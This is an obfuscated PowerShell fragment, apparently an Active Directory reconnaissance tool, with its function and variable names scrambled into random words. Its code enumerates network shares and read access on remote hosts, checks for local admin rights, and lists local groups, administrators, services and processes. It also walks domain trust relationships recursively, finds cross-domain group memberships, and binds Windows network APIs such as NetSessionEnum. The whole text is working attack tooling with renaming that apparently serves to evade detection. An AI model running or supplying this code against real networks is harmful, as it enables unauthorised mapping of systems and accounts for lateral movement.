    $kbdVGqbY99 = willingly -uVOoDBse99 $uVOoDBse99
    if ($kbdVGqbY99){
        "`n[+] Last user logged onto $uVOoDBse99 : $kbdVGqbY99"
    }
    
    $bphkWboz99 = Carly -uVOoDBse99 $uVOoDBse99
    if ($bphkWboz99 -and ($bphkWboz99.Count -ne 0)){
        "`n[+] Shares on $uVOoDBse99 :"
    }
    foreach ($share in $bphkWboz99) {
        if ($share -ne $null){
            $sGWzjfsu99 = $share.shi1_netname
            $ITkhsIQD99 = $share.shi1_remark
            $path = '\\'+$uVOoDBse99+'\'+$sGWzjfsu99
            
            if (($sGWzjfsu99) -and ($sGWzjfsu99.trim() -ne '')){
                
                "[+] $uVOoDBse99 - Share: $sGWzjfsu99 `t: $ITkhsIQD99"
                try{
                    $f=[IO.Directory]::GetFiles($path)
                    "[+] $uVOoDBse99 - Read Access - Share: $sGWzjfsu99 `t: $ITkhsIQD99"
                }
                catch {}
            }
        }
    }
    
    $lllxKUTh99 = Dave -Hostname $uVOoDBse99
    if ($lllxKUTh99){
        "`n[+] Current user has local admin access to $uVOoDBse99 !"
    }
    
    $nmYFXnxG99 = formulate -Hostname $uVOoDBse99 | Format-List | Out-String
    if ($nmYFXnxG99 -and $nmYFXnxG99.Length -ne 0){
        "`n[+] Local groups for $uVOoDBse99 :"
        $nmYFXnxG99.Trim()
    }
    else {
        "[!] Unable to retrieve localgroups for $uVOoDBse99"
    }
    
    $lBFlIaYU99 = douches -Hostname $uVOoDBse99 | Format-List | Out-String
    if ($lBFlIaYU99 -and $lBFlIaYU99.Length -ne 0){
        "`n[+] Local Administrators for $uVOoDBse99 :"
        $lBFlIaYU99.Trim()
    }
    else {
        "[!] Unable to retrieve local Administrators for $uVOoDBse99"
    }
    
    $evXTqbqQ99 = emulate -Hostname $uVOoDBse99 | Format-List | Out-String
    if ($evXTqbqQ99 -and $evXTqbqQ99.Length -ne 0){
        "`n[+] Local services for $uVOoDBse99 :"
        $evXTqbqQ99.Trim()
    }
    else {
        "[!] Unable to retrieve local services for $uVOoDBse99"
    }
    $zTlxTHug99 = hosteling -Hostname $uVOoDBse99
    if ($zTlxTHug99){
        "`n[+] Processes for $uVOoDBse99 :"
        $zTlxTHug99 | Format-Table -AutoSize
    }
    else {
        "[!] Unable to retrieve processes for $uVOoDBse99"
    }
}
function midnight {
    [CmdletBinding()]
    param(
        [string]
        $dOCGgZVW99
    )
    
    if ($dOCGgZVW99){
        
        try{
            $fQhHoBDz99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $dOCGgZVW99)
            [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($fQhHoBDz99).GetAllTrustRelationships()
        }
        catch{
            Write-Warning "The specified domain $dOCGgZVW99 does not exist, could not be contacted, or there isn't an existing trust."
            $null
        }
    }
    else{
        [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().GetAllTrustRelationships()
    }
}
function snazzier {
    [CmdletBinding()]
    param(
        [string]
        $dOCGgZVW99
    )
    $SiCsFzUn99 = $Null
    if ($dOCGgZVW99){
        try{
            $zrCEhkbw99 = ([Array](popularly))[0].Name
        }
        catch{
            $zrCEhkbw99 = $Null
        }
        try {
            $dn = "DC=$($dOCGgZVW99.Replace('.', ',DC='))"
            if ($zrCEhkbw99){
                $SiCsFzUn99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$zrCEhkbw99/$dn")
            }
            else{
                $SiCsFzUn99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn")
            }
            
            $SiCsFzUn99.filter = '(&(objectClass=trustedDomain))'
            $SiCsFzUn99.PageSize = 200
        }
        catch{
            Write-Warning "The specified domain $dOCGgZVW99 does not exist, could not be contacted, or there isn't an existing trust."
            $SiCsFzUn99 = $Null
        }
    }
    else{
        $dOCGgZVW99 = foxy
        $SiCsFzUn99 = [adsisearcher]'(&(objectClass=trustedDomain))'
        $SiCsFzUn99.PageSize = 200
    }
    if($SiCsFzUn99){
        $SiCsFzUn99.FindAll() | ForEach-Object {
            $props = $_.Properties
            $out = New-Object psobject
            Switch ($props.trustattributes) 
            { 
                16 { $FNlIKLyS99 = "CrossLink"} 
                32 { $FNlIKLyS99 = "ParentChild"} 
                64 { $FNlIKLyS99 = "External"} 
                68 { $FNlIKLyS99 = "ExternalQuarantined"} 
                Default { $FNlIKLyS99 = "unknown trust attribute number: $($props.trustattributes)" }
            } 
            Switch ($props.trustdirection){
                0 {$CbnKPBAf99 = "Disabled"}
                1 {$CbnKPBAf99 = "Inbound"}
                2 {$CbnKPBAf99 = "Outbound"}
                3 {$CbnKPBAf99 = "Bidirectional"}
            }
            $out | Add-Member Noteproperty 'SourceName' $dOCGgZVW99
            $out | Add-Member Noteproperty 'TargetName' $props.name[0]
            $out | Add-Member Noteproperty 'TrustType' $FNlIKLyS99
            $out | Add-Member Noteproperty 'TrustDirection' $CbnKPBAf99
            $out 
        }
    }
}
function leftovers {
    [CmdletBinding()]
    param(
        [string]
        $EzDyomfw99
    )
    $f = (congested -EzDyomfw99 $EzDyomfw99)
    if($f){
        $f.GetAllTrustRelationships()
    }
}
function frump {
    [CmdletBinding()]
    param(
        [string]
        $EOQyLHjF99,
        [string]
        $dOCGgZVW99
    )
    if ($dOCGgZVW99){
        if($EOQyLHjF99){
            $users = bounciest -dOCGgZVW99 $dOCGgZVW99 -EOQyLHjF99 $EOQyLHjF99
        }
        else{
            $users = bounciest -dOCGgZVW99 $dOCGgZVW99
        }
        $kJejNenV99 = "DC=" + $dOCGgZVW99 -replace '\.',',DC='
    }
    else {
        if($EOQyLHjF99){
            $users = bounciest -EOQyLHjF99 $EOQyLHjF99
        }
        else{
            $users = bounciest
        }
        $kJejNenV99 = [string] ([adsi]'').distinguishedname
        $dOCGgZVW99 = $kJejNenV99 -replace 'DC=','' -replace ',','.'
    }
    foreach ($user in $users){
        $nvLmfjiu99 = $user.memberof
        foreach ($HeQBJaod99 in $nvLmfjiu99){
            if($HeQBJaod99){
                $index = $HeQBJaod99.IndexOf("DC=")
                if($index){
                    $iJhzpIiF99 = $HeQBJaod99.substring($index)
                    if($iJhzpIiF99 -ne $kJejNenV99){
                        $out = new-object psobject 
                        $out | add-member Noteproperty 'Domain' $dOCGgZVW99
                        $out | add-member Noteproperty 'User' $user.samaccountname[0]
                        $out | add-member Noteproperty 'GroupMembership' $HeQBJaod99
                        $out
                    }
                }
                
            }
        }
    }
}
function tempera {
    $icZOYpHa99 = @{}
    $lBOWYMpK99 = New-Object System.Collections.Stack
    $yWmcwtBp99 = (([adsi]'').distinguishedname -replace 'DC=','' -replace ',','.')[0]
    $lBOWYMpK99.push($yWmcwtBp99)
    while($lBOWYMpK99.Count -ne 0){
        $d = $lBOWYMpK99.Pop()
        if (-not $icZOYpHa99.ContainsKey($d)) {
            $icZOYpHa99.add($d, "") | out-null
            try{
                $hEMdmbjs99 = midnight -dOCGgZVW99 $d
                if ($hEMdmbjs99){
                    foreach ($trust in $hEMdmbjs99){
                        $XhlvChLp99 = $trust.SourceName
                        $naUlzdYO99 = $trust.TargetName
                        $type = $trust.TrustType
                        $CbnKPBAf99 = $trust.TrustDirection
                        $lBOWYMpK99.push($naUlzdYO99) | out-null
                        $out = new-object psobject 
                        $out | add-member Noteproperty 'SourceDomain' $XhlvChLp99
                        $out | add-member Noteproperty 'TargetDomain' $naUlzdYO99
                        $out | add-member Noteproperty 'TrustType' $type
                        $out | add-member Noteproperty 'TrustDirection' $CbnKPBAf99
                        $out
                    }
                }
            }
            catch{
                Write-Warning "[!] Error: $_"
            }
        }
    }
}
function entrepreneurial {
    $icZOYpHa99 = @{}
    $lBOWYMpK99 = New-Object System.Collections.Stack
    $yWmcwtBp99 = (([adsi]'').distinguishedname -replace 'DC=','' -replace ',','.')[0]
    $lBOWYMpK99.push($yWmcwtBp99)
    while($lBOWYMpK99.Count -ne 0){
        $d = $lBOWYMpK99.Pop()
        if (-not $icZOYpHa99.ContainsKey($d)) {
            $icZOYpHa99.add($d, "") | out-null
            try{
                $hEMdmbjs99 = snazzier -dOCGgZVW99 $d
                if ($hEMdmbjs99){
                    foreach ($trust in $hEMdmbjs99){
                        $XhlvChLp99 = $trust.SourceName
                        $naUlzdYO99 = $trust.TargetName
                        $type = $trust.TrustType
                        $CbnKPBAf99 = $trust.TrustDirection
                        $lBOWYMpK99.push($naUlzdYO99) | out-null
                        $out = new-object psobject 
                        $out | add-member Noteproperty 'SourceDomain' $XhlvChLp99
                        $out | add-member Noteproperty 'TargetDomain' $naUlzdYO99
                        $out | add-member Noteproperty 'TrustType' $type
                        $out | add-member Noteproperty 'TrustDirection' $CbnKPBAf99
                        $out
                    }
                }
            }
            catch{
                Write-Warning "[!] Error: $_"
            }
        }
    }
}
function pyorrhea {
    [CmdletBinding()]
    param(
        [string]
        $EOQyLHjF99
    )
    $icZOYpHa99 = @{}
    $lBOWYMpK99 = New-Object System.Collections.Stack
    $yWmcwtBp99 = (([adsi]'').distinguishedname -replace 'DC=','' -replace ',','.')[0]
    $lBOWYMpK99.push($yWmcwtBp99)
    while($lBOWYMpK99.Count -ne 0){
        $d = $lBOWYMpK99.Pop()
        if (-not $icZOYpHa99.ContainsKey($d)) {
            $icZOYpHa99.add($d, "") | out-null
            if ($EOQyLHjF99){
                frump -dOCGgZVW99 $d -EOQyLHjF99 $EOQyLHjF99
            }
            else{
                frump -dOCGgZVW99 $d                
            }
            try{
                $hEMdmbjs99 = midnight -dOCGgZVW99 $d
                if ($hEMdmbjs99){
                    foreach ($trust in $hEMdmbjs99){
                        $XhlvChLp99 = $trust.SourceName
                        $naUlzdYO99 = $trust.TargetName
                        $type = $trust.TrustType
                        $CbnKPBAf99 = $trust.TrustDirection
                        $lBOWYMpK99.push($naUlzdYO99) | out-null
                    }
                }
            }
            catch{
                Write-Warning "[!] Error: $_"
            }
        }
    }
}
$Mod = sewers -ModuleName Win32
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([string], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([string], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([string], [string], [string], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),    
    (func netapi32 NetFileEnum ([Int]) @([string], [string], [string], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetConnectionEnum ([Int]) @([string], [string], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([string], [string], [Int])),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func kernel32 GetLastError ([Int]) @())
)
$ZBIJeAFb99 = presumptions $Mod SHARE_INFO_1 @{
    shi1_netname = field 0 String -MarshalAs @('LPWStr')
    shi1_type = field 1 UInt32
    shi1_remark = field 2 String -MarshalAs @('LPWStr')
}
$pcedBMWd99 = presumptions $Mod WKSTA_USER_INFO_1 @{
    wkui1_username = field 0 String -MarshalAs @('LPWStr')
    wkui1_logon_domain = field 1 String -MarshalAs @('LPWStr')
    wkui1_oth_domains = field 2 String -MarshalAs @('LPWStr')
    wkui1_logon_server = field 3 String -MarshalAs @('LPWStr')
}
$JHzrCmEf99 = presumptions $Mod SESSION_INFO_10 @{
    sesi10_cname = field 0 String -MarshalAs @('LPWStr')
    sesi10_username = field 1 String -MarshalAs @('LPWStr')
    sesi10_time = field 2 UInt32
    sesi10_idle_time = field 3 UInt32
}
$pIYVwDZb99 = presumptions $Mod FILE_INFO_3 @{
    fi3_id = field 0 UInt32
    fi3_permissions = field 1 UInt32
    fi3_num_locks = field 2 UInt32
    fi3_pathname = field 3 String -MarshalAs @('LPWStr')
    fi3_username = field 4 String -MarshalAs @('LPWStr')
}
$XNrtCFwg99 = presumptions $Mod CONNECTION_INFO_1 @{
    coni1_id = field 0 UInt32
    coni1_type = field 1 UInt32
    coni1_num_opens = field 2 UInt32
    coni1_num_users = field 3 UInt32
    coni1_time = field 4 UInt32
    coni1_username = field 5 String -MarshalAs @('LPWStr')
    coni1_netname = field 6 String -MarshalAs @('LPWStr')
}
$Types = $FunctionDefinitions | cruelest -Module $Mod -Namespace 'Win32'
$ckJEUlpR99 = $Types['netapi32']
$wyLERStH99 = $Types['advapi32']
$Kernel32 = $Types['kernel32']
